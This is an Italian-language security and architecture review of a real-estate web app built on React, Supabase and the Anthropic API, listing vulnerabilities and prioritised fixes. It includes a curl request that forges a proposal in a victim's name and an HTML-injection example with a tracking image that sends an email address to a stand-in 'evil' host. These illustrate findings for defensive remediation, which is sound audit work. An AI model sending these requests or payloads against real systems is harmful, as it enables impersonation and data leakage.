# RealAIstate — Architecture Review

Data: 2026-05-07
Scope: 7.831 LOC, 23 componenti React + 11 API serverless + Supabase
Reviewer: senior engineer, lettura indipendente del codice

## TL;DR

L'architettura è **sana** per il punto in cui sei. Stack scelto bene, pattern di sicurezza in maggioranza corretto, separazione frontend/serverless/DB pulita. Non hai bisogno di rifare niente.

Hai però **tre bug seri** che vanno chiusi prima di qualsiasi pitch:
1. `api/proposta-submit.js` accetta `user_id`/`user_email` dal body senza validare il JWT — chiunque può inviare proposte spacciandosi per qualsiasi utente.
2. Le 4 API che chiamano Anthropic (chat-immobile, chat-affordability, chat-venditore, smonta, generate-immobile-ai) sono **anonime e senza rate-limit**. Costi runaway possibili in poche ore.
3. `src/supabase.js` ha URL e anon key **hardcoded**, mentre il resto del codice legge da `import.meta.env`. Inconsistenza che ti morde alla prima rotazione.

Tempo per chiuderli tutti: **5-7 ore di lavoro mirato**, niente refactor. Il resto può aspettare il post-angel.

---

## 1. Mappa architetturale

```
[browser]
  └─ React 18 SPA (Vite)                ─── deploy Vercel statico
       │
       ├─ supabase-js (anon key)        ─── lettura immobili pubblici, auth, mio-storico
       │     │
       │     └─→ Supabase Postgres + Auth + Storage
       │
       └─ fetch /api/*                  ─── 11 funzioni serverless Node su Vercel
              │
              ├─→ Supabase REST (service_role) — bypass RLS per scritture/letture autoritative
              ├─→ Anthropic API           — chat & generazione contenuti
              ├─→ Brevo API/SMTP          — email transazionali
              ├─→ Yousign sandbox v3      — firma elettronica FEA
              └─→ (Google Maps Embed key è client-side, non passa da API)
```

**Tabelle Supabase**: `immobili`, `proposte`, `chat_messages`, `venditori` (lead onboarding ~30 campi), `scuse`. RLS attive su `immobili` (4 policy) con public read solo su `status='published'`. Pattern di ownership: `venditore_user_id ↔ auth.uid()`, decisione esplicita di non hardcodare email nelle policy.

**Auth**: Supabase Auth con email/password + custom SMTP Brevo. JWT in localStorage gestito da `supabase-js`. Frontend espone JWT via `useAuth()` (`AuthContext` in [main.jsx](src/main.jsx)).

**Routing**: react-router-dom v6, route alias `/compra/:id ↔ /immobili/:id` per retrocompat link in email/IG.

**Workflow status immobile**: `draft → pending_review → published → sold/archived`. Promozione `pending_review → published` fatta a mano via SQL UPDATE su Supabase (questo è un punto, vedi §4.7).

---

## 2. Punti di forza — cosa va tenuto

1. **Pattern auth corretto in 3 endpoint critici**: [vendi-submit.js:7-18](api/vendi-submit.js), [richiedi-pubblicazione.js:5-50](api/richiedi-pubblicazione.js), [yousign-proposta.js:31-81](api/yousign-proposta.js) validano il JWT con `auth/v1/user`, prendono `user_id` dalla risposta (mai dal body), e verificano l'ownership `caller.id === immobile.venditore_user_id`. È esattamente il pattern giusto. Da copiare ovunque.
2. **Letture autoritative dal DB**: [proposta-submit.js:31-50](api/proposta-submit.js) legge prezzo e `venditore_user_id` dal DB invece di fidarsi del frontend. Anche se l'auth è bucata (vedi §3.1), almeno il calcolo dei delta non è manipolabile.
3. **RLS attive con policy via `auth.uid()`**: la decisione documentata in [STATO_PROGETTO.md:155](src/STATO_PROGETTO.md) di non hardcodare email è quella corretta. Continua su questa strada.
4. **Service role solo server-side**: le chiavi `SUPABASE_SECRET_KEY`, `ANTHROPIC_API_KEY`, `YOUSIGN_API_KEY`, `BREVO_API_KEY` stanno tutte in env Vercel, mai nel bundle frontend. Bene.
5. **Separazione `venditori` (lead) vs `immobili` (entità pubblica)**: scelta giusta. Permette di chiudere il funnel di onboarding indipendentemente dalla qualità della scheda.
6. **Public listing senza login**: [Listing.jsx:175-191](src/Listing.jsx) usa anon key + RLS public read su `status='published'`. Esattamente come va fatto. Niente roundtrip serverless inutile.
7. **STATO_PROGETTO.md come hand-off doc**: pattern eccellente per founder solo che alterna sessioni AI. Continua a tenerlo aggiornato.
8. **Brevo + Namecheap Private Email + DNS validati**: deliverability seria, sender autenticato, DMARC in monitoring. Non sottovalutare quanto è raro questo livello in MVP.
9. **Yousign sandbox + path di switch a production documentato**: 60-90 minuti di runbook in STATO_PROGETTO. Bene.
10. **Google Maps key restretta a 4 referrer + sola Maps Embed API**: hai imparato la lezione (la rotazione di emergenza è documentata). Replica questo riflesso ovunque.

---

## 3. Sicurezza — buchi reali

### 3.1 CRITICO — `proposta-submit.js` non valida il JWT
[api/proposta-submit.js:17](api/proposta-submit.js): `const { immobile, user_email, user_id, importo, ... } = req.body`. Nessun `Authorization: Bearer` letto. Il `user_id` arriva dal client e viene scritto su `proposte.compratore_user_id` direttamente.

Vettore di attacco:
```
curl -X POST https://realaistate.ai/api/proposta-submit \
  -H 'Content-Type: application/json' \
  -d '{"immobile":{"id":1},"user_email":"vittima@x.it","user_id":"<uuid-vittima>","importo":1}'
```
Conseguenza: si crea una proposta a nome della vittima, parte un'email "Hai una nuova proposta" al venditore reale (con la vittima come compratore), e l'attaccante può inquinare la dashboard del venditore con dozzine di proposte fake. Bonus: HTML injection in `condizioni`/`note` finisce dritto nell'inbox del venditore (vedi §3.5).

**Fix**: 20 minuti. Copia il pattern di [yousign-proposta.js:32-41](api/yousign-proposta.js): leggi `Authorization` header, chiama `supabase.auth.getUser(token)`, prendi `caller.id` da lì, ignora ciò che arriva dal body.

### 3.2 CRITICO — API AI senza auth né rate-limit
[chat-immobile.js](api/chat-immobile.js), [chat-affordability.js](api/chat-affordability.js), [chat-venditore.js](api/chat-venditore.js), [smonta.js](api/smonta.js) accettano richieste anonime e chiamano Anthropic direttamente. Modello: `claude-opus-4-5` (input $15/Mtok, output $75/Mtok) o `sonnet`. Nessun limit per IP, nessun captcha, CORS `*`.

[generate-immobile-ai.js](api/generate-immobile-ai.js) è il caso peggiore: accetta `immobile_id` da chiunque, usa **service_role key** per riscrivere `ai_summary`, `punti_forza`, `domande_consigliate` di **qualsiasi** immobile in DB. Un attaccante può iterare tutti gli ID e (a) bruciare il tuo budget Anthropic, (b) sovrascrivere il contenuto della tua vetrina con AI hallucination o vandalismo guidato (system prompt poisoning via `descrizione`).

Costi reali: 10k req/giorno × 2k token Opus medi = ~€600/giorno bruciato. Una settimana di hammering ti azzera la cassa.

**Fix per pre-angel**: rate-limit in-memory con Vercel KV o Upstash Redis (free tier copre). 2-3 req/min/IP per anonimi sulle chat. Per `generate-immobile-ai`: aggiungi JWT verification + ownership check identico a `richiedi-pubblicazione`. Tempo totale: 2-3 ore.

### 3.3 ALTO — `chat_messages` con INSERT pubblico
[chat-immobile.js:38-61](api/chat-immobile.js) scrive su `chat_messages` con `SUPABASE_ANON_KEY`. Implica che la RLS della tabella permetta INSERT pubblico (altrimenti fallirebbe). Significa che chiunque può:
- Iniettare messaggi falsi in qualsiasi `sessione_id` se ne indovina uno (UUIDv4, brute-force impraticabile, ma social engineering via referer/screen-share possibile).
- Creare migliaia di sessioni vuote per gonfiare la tabella.
- Fingere di essere l'AI scrivendo `mittente='ai'`.

**Fix**: muovi la scrittura `chat_messages` lato API server con service_role (la API già lo fa, ma l'INSERT viene comunque permesso pubblicamente dalla RLS). Restringi la policy a `service_role` only per INSERT, e public read solo se `compratore_email = auth.email()` o simile. 1 ora di audit RLS.

### 3.4 ALTO — `src/supabase.js` ha credenziali hardcoded
[src/supabase.js:3-4](src/supabase.js): URL e anon key letterali, mentre [VendiForm.jsx:283-287](src/VendiForm.jsx) e [VenditoreDashboard.jsx:352](src/VenditoreDashboard.jsx) leggono da `import.meta.env.VITE_SUPABASE_URL`.

Sì, l'anon key è "pubblica" per design. Ma:
- Il giorno che vorrai un ambiente staging, dovrai modificare codice, non env.
- Se ruoti la anon key (ti capiterà), questo file resta indietro silenziosamente.
- L'inconsistenza nel codebase è già un anti-pattern di igiene.

**Fix**: 15 minuti. Sostituisci con `import.meta.env.VITE_SUPABASE_URL` + `VITE_SUPABASE_ANON_KEY`. Aggiungi `.env.local` validation in `vite.config.js` (fail fast se mancano).

### 3.5 MEDIO — HTML injection nei template email
[proposta-submit.js:147-155](api/proposta-submit.js): `condizioni` e `note` arrivano dal frontend e vengono interpolati raw nell'HTML email inviato al venditore. Stesso pattern in [chat-immobile.js:91-93](api/chat-immobile.js) con `domandaOriginale` e `rispostaAI`, e in [vendi-submit.js:144-217](api/vendi-submit.js) con `dati.nome`, `dati.indirizzo`, `dati.note`.

Se un attaccante mette `<img src=x onerror=...>` o un tracking pixel `<img src='https://evil/?email=...'>`, finisce nell'inbox del venditore. Gmail/Outlook bloccano la maggior parte dei JS, ma immagini-tracker partono regolari.

**Fix**: 30 minuti. Helper `escapeHtml(s)` semplice (`s.replace(/[&<>"']/g, c => map[c])`), applicato a tutti i campi user-controlled prima dell'interpolazione. Niente librerie.

### 3.6 MEDIO — CORS `*` ovunque
Tutte le API accettano `Access-Control-Allow-Origin: *`. Combinato con §3.2 amplifica il vettore: qualsiasi sito può chiamare le tue API AI senza che il browser blocchi nulla.

**Fix**: 30 minuti. Restringi a `realaistate.ai`, `*.realaistate.ai`, `*.vercel.app`. Subscribe e scuse possono restare aperti se servono embed esterni.

### 3.7 MEDIO — RLS legacy `USING (true)`
Tu stesso ([STATO_PROGETTO.md:215](src/STATO_PROGETTO.md)) hai segnalato il pattern come "velenoso". Audit periodico è la nota giusta — fallo prima dell'angel come due-diligence interna.

### 3.8 BASSO — Service role per query non-privilegiate
Diverse API usano service_role per leggere `immobili?id=eq.X` quando potrebbero usare anon + RLS. Riduce il blast radius in caso di leak della chiave. Non urgente.

### 3.9 BASSO — Nessun audit log
Cambi di status immobile fatti via SQL diretta non lasciano traccia "chi/quando". Per ora va bene, ma il giorno che hai un dispute con un venditore vorrai un audit trail.

---

## 4. Debiti tecnici prioritizzati per impatto

1. **§3.1 + §3.2 + §3.3 + §3.4 + §3.5** — vedi sezione sicurezza.
2. **`Immobile.jsx` 1.088 righe** — monolite con CSS inline + chat + affordability + modal proposta + mappa + galleria. Test impossibili. Non urgente, ma è la prima cosa che farai dopo l'angel.
3. **`App.jsx` ha ~230 righe di CSS inline** ([App.jsx:28-260](src/App.jsx)) — re-renderizzato a ogni mount. Stesso pattern in [Listing.jsx:6-63](src/Listing.jsx), [Immobile.jsx:8-198](src/Immobile.jsx), [Admin.jsx:35-50](src/Admin.jsx). Da spostare in `*.module.css` quando avrai tempo.
4. **VendiForm.jsx 745 righe + VenditoreDashboard.jsx 647 righe**: stessa categoria. Vivibili ora, refactor obbligato a 2x complessità.
5. **Approvazione pubblicazione manuale via SQL** ([STATO_PROGETTO.md:162](src/STATO_PROGETTO.md)): un bottone "Approva" in admin chiama una API che (a) cambia status, (b) chiama `generate-immobile-ai`, (c) manda email al venditore. Già nel tuo backlog. Va fatto a ~5 immobili pubblicati.
6. **Formato `foto` jsonb misto** (URL completi vs nomi file): tollerato a runtime con `includes('://')`. Costa 10 righe in 2 punti. OK per ora.
7. **Nessun observability**: zero Sentry, zero structured logging. Hai `console.error` in 30 punti. Quando qualcosa rompe in prod lo sai dal venditore che ti scrive. Aggiungi Sentry (free tier 5k events/mese) appena lanci pubblicamente.
8. **Nessun test**: zero unit, zero E2E. OK per ora, vincolo dopo l'angel.
9. **`vite dev` non serve le API**: testare in locale richiede `vercel dev`. Documentato in STATO_PROGETTO. Non urgente ma doloroso quando capita.
10. **File orfani**: `src/App.jsx.backup`, branch `feat/vendi-reale`, `feat/immobile-dinamico`, `fix/dashboard-venditore-cover`. Igiene.

---

## 5. Rischi di scalabilità

| Scala | Cosa rompe | Perché |
|---|---|---|
| **10 immobili / 100 utenti** | Niente. | Sovradimensionato. Free tier ovunque. |
| **100 immobili / 1.000 utenti** | Brevo free (300/giorno) → upgrade a Lite €8/mese. Storage Supabase 1GB → ~80% pieno (8 foto × 500KB × 100 immobili = 400MB). Costi Anthropic se §3.2 non è chiuso: bruci €500-1000/mese in chat anonime. Listing senza paginazione: 200-400ms render. | Volumi fisici, niente di architetturale. |
| **1.000 immobili / 10.000 utenti** | **Listing senza paginazione**: 1-3s, UX rotta. **Cover loading**: 1.000 immagini in un solo fetch DOM, bandwidth Storage Supabase pesante senza CDN. **Anthropic costs**: 10k chat/giorno × 1.500 token × Opus = €1.500-3.000/giorno. Devi switchare la chat a Sonnet 4.6 + prompt caching nativo Anthropic (riduce input dell'80%). **Postgres free**: superi 500MB DB, vai su Supabase Pro $25/mese. **`chat_messages`**: cresce linearmente, indici su `sessione_id` e `(immobile_id, created_at)` diventano obbligatori. **Idempotenza scritture**: `proposta-submit` chiamato 2 volte = 2 proposte. Vai aggiunta. **Vercel Pro $20/mese**: per concurrency e logs. **Real-time chat**: oggi non c'è, vorrai Supabase Realtime sui canali `chat_messages`. | Niente di esistenziale, è ingegneria normale. |

**Bottleneck più probabile prima del PMF**: Anthropic costs se §3.2 resta aperto. È il rischio finanziario reale. Tutti gli altri sono ordinarie scalette d'upgrade.

---

## 6. Modifiche raccomandate

### (a) Prima del primo angel — entro 1-2 settimane

Tempo totale stimato: **5-7 ore di lavoro mirato**. Niente refactor.

| # | Cosa | Tempo | Riferimento |
|---|---|---|---|
| 1 | Fix `proposta-submit.js`: copia pattern JWT da `yousign-proposta.js`. | 20 min | §3.1 |
| 2 | `escapeHtml()` helper applicato a `condizioni`, `note`, `nome`, `domandaOriginale`, `rispostaAI` nei template email. | 30 min | §3.5 |
| 3 | Rate-limit in-memory (Upstash Redis free tier) sulle 4 API AI: 2-3 req/min/IP anonimi, 10/min loggati. | 2-3 ore | §3.2 |
| 4 | `generate-immobile-ai.js`: JWT verification + ownership check. | 30 min | §3.2 |
| 5 | Audit RLS `chat_messages` e `scuse`: restringi INSERT a service_role. | 1 ora | §3.3 |
| 6 | Sostituisci hardcode in `src/supabase.js` con `import.meta.env.VITE_*`. | 15 min | §3.4 |
| 7 | CORS restretto a `realaistate.ai` + `*.vercel.app` su tutte le API tranne subscribe/scuse. | 30 min | §3.6 |
| 8 | Cancella `src/App.jsx.backup` e branch git morti. | 5 min | §4.10 |
| 9 | Sentry free tier: SDK frontend + wrapper API. | 1 ora | §4.7 |

Nota: niente in questa lista è un refactor. Sono fix chirurgici, ognuno isolabile in un singolo commit. Se ne fai uno al giorno per una settimana sei a posto.

### (b) Dopo primo round angel — 1-3 mesi di pista finanziata

1. Pagina admin `/admin/immobili` con bottone "Approva" → API `pubblica-immobile` (cambia status + chiama `generate-immobile-ai` + email venditore). Sostituisce l'UPDATE manuale.
2. Refactor `Immobile.jsx`: estrazione di `<AiChat>`, `<AffordabilityChat>`, `<ProposalModal>`, `<Gallery>`. CSS in `Immobile.module.css`. Target: max 250 righe per file. **1 giornata.**
3. Webhook Yousign → aggiorna `proposte.status='signed'`. Già nel tuo backlog.
4. Paginazione `Listing.jsx` (limit 24, infinite scroll). **3 ore.**
5. Audit completo RLS, eliminazione policy `USING (true)` legacy.
6. Test E2E con Playwright sui 4 happy path: signup → vendi → richiedi pub → proposta → accetta → firma. **1 giornata.**
7. Prompt caching Anthropic: il system prompt di `chat-immobile` viene rimandato uguale a ogni messaggio. Cache hit = -80% input tokens. Vedi `claude-api` skill Anthropic.
8. Tabelle DB `documenti_immobile` + `comparabili` (oggi hardcoded fallback per Capecelatro id=1).
9. Standardizzazione formato `foto` jsonb (URL completi). Migrazione `UPDATE immobili SET foto = ...` su record vecchi.
10. Idempotenza `proposta-submit` (dedup chiave `(compratore_user_id, immobile_id)` window 5 min).

### (c) Post product-market-fit — quando hai retention misurabile e ARR

1. TypeScript migration. A 7.800 righe il valore è ancora basso. Da 20k+ righe inizia a pagare.
2. Code-split per route con `React.lazy` (oggi è un bundle unico ~600KB stimato).
3. Design system / componenti riusabili (Tailwind o stitches o vanilla CSS modules con tokens).
4. Storybook.
5. CDN/Cloudflare per le foto Storage Supabase.
6. CI obbligatoria: GitHub Actions con typecheck + lint + test su ogni PR. Vercel preview obbligatorio prima del merge.
7. Real-time chat (Supabase Realtime canali) invece di refresh manuale dashboard.
8. Background jobs per `generate-immobile-ai` (oggi sincrono, blocca submit `vendi`).
9. APM (Datadog / Honeycomb / OpenTelemetry).
10. Multi-paese / multi-lingua (oggi hardcoded "Milano/Verona", `HomeEN.jsx` placeholder).
11. Audit log strutturato (chi cambia status, quando, da dove).
12. GDPR / compliance: data export, right-to-be-forgotten, encryption-at-rest review.

---

## 7. Verdetto

Per founder solo a una settimana dal primo pitch angel: **l'architettura è quella giusta, non rifare niente**. Fai i 9 fix in (a), che sono mezza giornata se concentrato. Quello che hai costruito in 5 settimane è coerente, le decisioni documentate in STATO_PROGETTO sono in maggioranza tecnicamente valide, e i tre pattern di sicurezza che funzionano (JWT auth con `auth/v1/user`, ownership check, RLS via `auth.uid()`) sono esattamente quelli che vorresti vedere in due-diligence.

I tre buchi seri (proposta-submit, rate-limit AI, hardcoded supabase) sono **bug**, non **debiti architetturali**. Fixali e basta.

Quando avrai i soldi per il primo dev, dagli (b) come backlog. Non prima.
